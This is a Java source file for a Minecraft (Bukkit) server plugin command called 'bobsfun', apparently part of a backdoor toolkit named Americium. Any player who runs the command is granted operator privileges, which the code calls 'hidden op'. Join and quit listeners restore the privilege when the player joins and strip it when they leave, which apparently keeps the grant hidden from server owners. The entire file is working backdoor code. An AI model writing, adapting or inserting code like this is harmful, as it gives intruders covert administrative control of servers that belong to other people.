package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.ArrayList;
import java.util.UUID;

public class bobsfun implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"bobsfun"};
    }

    @Override
    public String getDescription() {
        return "Ops you when you join, but deops you when you leave.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            UUID uuid = executor.getUniqueId();
            if (this.toggled.contains(uuid)) {
                this.toggled.remove(uuid);
                executor.setOp(false);
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Toggled hidden op off!");
                return;
            }

            this.toggled.add(uuid);
            executor.setOp(true);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Toggled hidden op on!");
        });
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler
    private void leaveChecker(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        if (this.toggled.contains(p.getUniqueId())) {
            p.setOp(false);
        }
    }

    @EventHandler
    private void joinChecker(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        if (this.toggled.contains(p.getUniqueId())) {
            p.setOp(true);
            p.sendMessage(Colors.Prefix + Colors.Success + "(Hidden OP) Successfully reopped you!");
        }
    }
}
